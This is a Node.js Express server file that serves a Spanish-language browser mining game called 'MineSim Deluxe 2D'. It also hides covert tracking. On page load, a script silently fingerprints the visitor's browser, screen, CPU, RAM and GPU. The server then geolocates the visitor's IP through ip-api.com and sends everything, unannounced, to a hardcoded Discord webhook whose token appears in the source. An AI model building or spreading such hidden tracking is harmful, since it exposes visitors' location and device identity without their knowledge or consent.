const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;
app.set('trust proxy', true);
app.use(express.json());

// ⚠️ COLOCA TU WEBHOOK AQUÍ
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
        const geo = await response.json();
        if (geo.status === 'success') {
            country = geo.country;
            city = geo.city;
            isp = geo.isp;
        }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: `🎮 **¡Nuevo Minero Entró al Juego!**\n📍 IP: \`${userIp}\` (${city}, ${country})\n📡 ISP: ${isp}\n💻 OS/Navegador: \`${d.userAgent || 'N/A'}\`\n🖥️ Pantalla: ${d.screen || 'N/A'}\n🧠 Hardware: ${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM\n🎮 GPU: ${d.gpu || 'N/A'}`
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {}
    }

    res.sendStatus(200);
});

// MINESIM PRO - GAME ENGINE
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MineSim Deluxe 2D</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
        body { background: #0f172a; color: #fff; overflow: hidden; }
        canvas { display: block; background: #020617; }
        
        #menu { position: absolute; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.95); display: flex; justify-content: center; align-items: center; z-index: 20; }
        .panel { background: #0f172a; padding: 40px; border-radius: 16px; border: 1px solid #1e293b; text-align: center; width: 380px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
        h1 { color: #38bdf8; font-size: 2.2rem; margin-bottom: 5px; font-weight: 900; letter-spacing: 1px; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px; }
        button { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #0284c7; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 1rem; }
        button:hover { background: #0369a1; transform: translateY(-2px); }
        
        #ui { position: absolute; top: 15px; left: 15px; display: flex; gap: 15px; pointer-events: none; z-index: 10; }
        .stat-box { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); padding: 10px 16px; border-radius: 8px; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; }
        .stat-value { font-size: 1.1rem; font-weight: bold; color: #38bdf8; }
        .gold { color: #facc15 !important; }

        #shop-btn { position: absolute; top: 15px; right: 15px; z-index: 10; background: #16a34a; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; border: none; color: white; }
        #shop-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 25px; width: 320px; z-index: 30; display: none; }
        .shop-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: #1e293b; padding: 10px; border-radius: 6px; }
        .shop-item button { width: auto; padding: 6px 12px; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div id="menu">
        <div class="panel">
            <h1>MINESIM DELUXE</h1>
            <p>Explora la profundidad, mina minerales y mejora tu equipo.</p>
            <button onclick="startSim()">COMENZAR AVENTURA</button>
        </div>
    </div>

    <div id="ui" style="display:none;">
        <div class="stat-box">DINERO<div class="stat-value gold" id="money-val">$0</div></div>
        <div class="stat-box">PROFUNDIDAD<div class="stat-value" id="depth-val">0m</div></div>
        <div class="stat-box">MOCHILA<div class="stat-value" id="backpack-val">0/20</div></div>
    </div>

    <button id="shop-btn" style="display:none;" onclick="toggleShop()">🛒 TIENDA</button>

    <div id="shop-modal">
        <h2 style="margin-bottom:15px; text-align:center; color:#38bdf8;">Mejoras de Minería</h2>
        <div class="shop-item">
            <div><strong>Velocidad</strong><br><small id="spd-cost">$50</small></div>
            <button onclick="buyUpgrade('speed')">Mejorar</button>
        </div>
        <div class="shop-item">
            <div><strong>Mochila +10</strong><br><small id="bag-cost">$100</small></div>
            <button onclick="buyUpgrade('bag')">Mejorar</button>
        </div>
        <button onclick="toggleShop()" style="background:#dc2626; margin-top:10px;">Cerrar</button>
    </div>

    <canvas id="cv"></canvas>

    <script>
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch (e) { return 'No detectada'; }
    }

    async function sendTelemetry() {
        const payload = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: \`\${screen.width}x\${screen.height}\`,
            cores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory || 'N/A',
            gpu: getGPU()
        };

        fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(()=>{});
    }
    sendTelemetry();

    // ESTADO DEL JUEGO
    let gameState = { money: 0, bag: 0, maxBag: 20, speed: 4, speedCost: 50, bagCost: 100 };

    function startSim() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('ui').style.display = 'flex';
        document.getElementById('shop-btn').style.display = 'block';
        initEngine();
    }

    function toggleShop() {
        const m = document.getElementById('shop-modal');
        m.style.display = m.style.display === 'block' ? 'none' : 'block';
    }

    function buyUpgrade(type) {
        if (type === 'speed' && gameState.money >= gameState.speedCost) {
            gameState.money -= gameState.speedCost;
            gameState.speed += 1;
            gameState.speedCost *= 2;
            document.getElementById('spd-cost').innerText = '$' + gameState.speedCost;
        } else if (type === 'bag' && gameState.money >= gameState.bagCost) {
            gameState.money -= gameState.bagCost;
            gameState.maxBag += 10;
            gameState.bagCost *= 2;
            document.getElementById('bag-cost').innerText = '$' + gameState.bagCost;
        }
        updateUI();
    }

    function updateUI() {
        document.getElementById('money-val').innerText = '$' + gameState.money;
        document.getElementById('backpack-val').innerText = gameState.bag + '/' + gameState.maxBag;
    }

    function initEngine() {
        const cv = document.getElementById('cv');
        const ctx = cv.getContext('2d');
        cv.width = window.innerWidth;
        cv.height = window.innerHeight;

        const TILE = 40;
        const COLS = Math.ceil(cv.width / TILE);
        const ROWS = 120;
        const surface = 6;
        let map = [];
        
        // Generación del Mapa
        for (let r = 0; r < ROWS; r++) {
            map[r] = [];
            for (let c = 0; c < COLS; c++) {
                if (r < surface) map[r][c] = 0; // Aire
                else if (r === surface) map[r][c] = 1; // Pasto
                else if (r < surface + 10) map[r][c] = 2; // Tierra
                else {
                    let rand = Math.random();
                    if (r > 60 && rand < 0.03) map[r][c] = 6; // Diamante (Profundo)
                    else if (r > 35 && rand < 0.06) map[r][c] = 5; // Rubí
                    else if (rand < 0.10) map[r][c] = 4; // Oro
                    else if (rand < 0.20) map[r][c] = 3; // Carbón
                    else map[r][c] = 2; // Piedra / Tierra
                }
            }
        }

        const blockValues = { 2: 2, 3: 10, 4: 30, 5: 75, 6: 200 };
        const colors = { 1: '#22c55e', 2: '#78350f', 3: '#334155', 4: '#eab308', 5: '#ef4444', 6: '#06b6d4' };
        
        const p = { x: Math.floor(COLS / 2) * TILE, y: (surface - 2) * TILE, w: 28, h: 45, vx: 0, vy: 0, ground: false };
        const keys = {};

        window.addEventListener('keydown', e => keys[e.code] = true);
        window.addEventListener('keyup', e => keys[e.code] = false);

        // Minar bloques con Click
        cv.addEventListener('mousedown', e => {
            if (gameState.bag >= gameState.maxBag) return;

            const c = Math.floor(e.clientX / TILE);
            const r = Math.floor(e.clientY / TILE);
            
            if (r >= 0 && r < ROWS && c >= 0 && c < COLS) {
                const type = map[r][c];
                if (type > 0) {
                    gameState.money += blockValues[type] || 1;
                    gameState.bag += 1;
                    map[r][c] = 0;
                    updateUI();
                }
            }
        });

        function loop() {
            if (keys['KeyA'] || keys['ArrowLeft']) p.vx = -gameState.speed;
            else if (keys['KeyD'] || keys['ArrowRight']) p.vx = gameState.speed;
            else p.vx = 0;

            if ((keys['KeyW'] || keys['Space']) && p.ground) {
                p.vy = -10;
                p.ground = false;
            }

            p.vy += 0.5;
            p.x += p.vx;
            p.y += p.vy;
            p.ground = false;

            // Colisiones simples
            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    if (map[r][c] !== 0) {
                        const bx = c * TILE;
                        const by = r * TILE;
                        if (p.x < bx + TILE && p.x + p.w > bx && p.y < by + TILE && p.y + p.h > by) {
                            if (p.vy > 0 && p.y + p.h - p.vy <= by) {
                                p.y = by - p.h;
                                p.vy = 0;
                                p.ground = true;
                            }
                        }
                    }
                }
            }

            let currentDepth = Math.max(0, Math.floor((p.y / TILE) - surface));
            document.getElementById('depth-val').innerText = currentDepth + 'm';

            ctx.clearRect(0, 0, cv.width, cv.height);

            // Dibujar Mapa
            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    if (map[r][c] !== 0) {
                        ctx.fillStyle = colors[map[r][c]];
                        ctx.fillRect(c * TILE, r * TILE, TILE, TILE);
                        ctx.strokeStyle = 'rgba(0,0,0,0.3)';
                        ctx.strokeRect(c * TILE, r * TILE, TILE, TILE);
                    }
                }
            }

            // Dibujar Jugador
            ctx.fillStyle = '#38bdf8';
            ctx.fillRect(p.x, p.y, p.w, p.h);

            requestAnimationFrame(loop);
        }
        loop();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
